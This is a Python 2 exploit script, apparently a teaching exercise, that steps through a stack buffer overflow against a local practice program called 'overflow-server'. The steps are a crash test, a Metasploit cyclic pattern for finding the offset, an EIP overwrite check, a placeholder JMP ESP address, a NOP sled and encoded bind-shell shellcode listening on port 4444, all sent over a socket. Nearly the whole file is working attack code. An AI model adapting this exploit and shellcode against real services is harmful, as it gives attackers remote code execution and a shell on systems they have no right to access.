#!/usr/bin/python
# Copyright 2014 Jarmo Puttonen <jarmo.puttonen@gmail.com>. 
# All rights reserved.
# Use of this source code is governed by a MIT-style licence that can be found in the LICENCE file.

# Exploit designed for exploiting overflow-server.
# ------------------------------------------------
# Modify offset-variable and address of "JMP ESP"-instruction ("0xAAAAAAAA" in this script) 
# according to values reported by used assembler level analysing debugger.

import sys, socket, struct
from time import sleep
target = "127.0.0.1" # IP of machine running overflow-server.
port = 666 # Port where overflow-server is run.

""" Step 0: Send username before sending any payload (username can't be used to overflow server). """
username = "Bacon";

""" Step 1: Check for buffer overflow vulnerabilities. If payload results in EIP value of 41414141, target can exploited. """
payload = "A" * 3000;

""" Step 2: Determine correct offset for EIP-address overflowing. 
After sending payload, copy the value of EIP and run it through pattern_offset.rb (part of metasploit framework).
pattern_offset.rb will return offset value which can be used to modify EIP-value. """
#payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9";

""" Step 3: Test if we can modify EIP-value."""
#offset = 1; # Offset from step 2.
#payload = "A" * offset; # Filling for stack.
#payload += "B" * 4; # If correct offset is used, this row should result in EIP getting overwritten with 42424242 (hex-value of character B).
#payload += "C" * (3000 - len(payload)); # Rest of the payload is used as location for shellcode.

""" Step 4: Test if "JMP ESP"-instruction works. Instruction can be found in one or more of executable modules of main executable (eg. WS2_32.dll)."""
#offset = 1; # Offset from step 2.
#payload = "A" * offset; # Filling for stack.
#payload += struct.pack('<I', 0xAAAAAAAA); # Convert address of "JMP ESP"-instruction to little endian.
#payload += "\xCC" * (3000 - len(payload)); # Send INT3-instruction that will pause debugger.

""" Step 5: Exploit server using "JMP ESP"-instruction, NOP-instructions and shellcode."""
#offset = 1; # Offset from step 2.
#payload = "A" * offset; # Filling for stack.
#payload += struct.pack('<I', 0xAAAAAAAA); # Address of "JMP ESP"-instruction.
#payload += "\x90" * 20; # NOP-sled. No-operation-instructions which allow using exploit even when precise target address of "JMP ESP"-instruction is not known.
# Below is sample shellcode. It has been created with metasploit framework using msfpayload for binding shell (listens port 4444) and msfencode for removing bad characters (eg. \x00 which results in termination of string in C).
#payload += "\xbf\x99\x3d\xd0\x13\xda\xc9\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x56\x31\x7d\x13\x83\xc5\x04\x03\x7d\x96\xdf\x25\xef\x40\x96\xc6\x10\x90\xc9\x4f\xf5\xa1\xdb\x34\x7d\x93\xeb\x3f\xd3\x1f\x87\x12\xc0\x94\xe5\xba\xe7\x1d\x43\x9d\xc6\x9e\x65\x21\x84\x5c\xe7\xdd\xd7\xb0\xc7\xdc\x17\xc5\x06\x18\x45\x25\x5a\xf1\x01\x97\x4b\x76\x57\x2b\x6d\x58\xd3\x13\x15\xdd\x24\xe7\xaf\xdc\x74\x57\xbb\x97\x6c\xdc\xe3\x07\x8c\x31\xf0\x74\xc7\x3e\xc3\x0f\xd6\x96\x1d\xef\xe8\xd6\xf2\xce\xc4\xdb\x0b\x16\xe2\x03\x7e\x6c\x10\xbe\x79\xb7\x6a\x64\x0f\x2a\xcc\xef\xb7\x8e\xec\x3c\x21\x44\xe2\x89\x25\x02\xe7\x0c\xe9\x38\x13\x85\x0c\xef\x95\xdd\x2a\x2b\xfd\x86\x53\x6a\x5b\x69\x6b\x6c\x03\xd6\xc9\xe6\xa6\x03\x6b\xa5\xae\xe0\x46\x56\x2f\x6e\xd0\x25\x1d\x31\x4a\xa2\x2d\xba\x54\x35\x51\x91\x21\xa9\xac\x19\x52\xe3\x6a\x4d\x02\x9b\x5b\xed\xc9\x5b\x63\x38\x5d\x0c\xcb\x92\x1e\xfc\xab\x42\xf7\x16\x24\xbd\xe7\x18\xee\xc8\x2f\xd7\xca\x99\xc7\x1a\xed\x0c\x44\x92\x0b\x44\x64\xf2\x84\xf0\x46\x21\x1d\x67\xb8\x03\x31\x30\x2e\x1b\x5f\x86\x51\x9c\x75\xa5\xfe\x34\x1e\x3d\xed\x80\x3f\x42\x38\xa1\x36\x7b\xab\x3b\x27\xce\x4d\x3b\x62\xb8\xee\xae\xe9\x38\x78\xd3\xa5\x6f\x2d\x25\xbc\xe5\xc3\x1c\x16\x1b\x1e\xf8\x51\x9f\xc5\x39\x5f\x1e\x8b\x06\x7b\x30\x55\x86\xc7\x64\x09\xd1\x91\xd2\xef\x8b\x53\x8c\xb9\x60\x3a\x58\x3f\x4b\xfd\x1e\x40\x86\x8b\xfe\xf1\x7f\xca\x01\x3d\xe8\xda\x7a\x23\x88\x25\x51\xe7\xb8\x6f\xfb\x4e\x51\x36\x6e\xd3\x3c\xc9\x45\x10\x39\x4a\x6f\xe9\xbe\x52\x1a\xec\xfb\xd4\xf7\x9c\x94\xb0\xf7\x33\x94\x90";

# Open socket to target.
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target,port))
print s.recv(2048) # Receive server greeting.
print s.recv(2048) # Receive info-message about username.
s.send(username) # Send username to server.
print s.recv(2048) # Receive info-message about sending messages.
s.send(payload) # Send payload.
s.close()
""" If exploiting was successfully completed, targed server should not have crashed and shellcode should be running. """
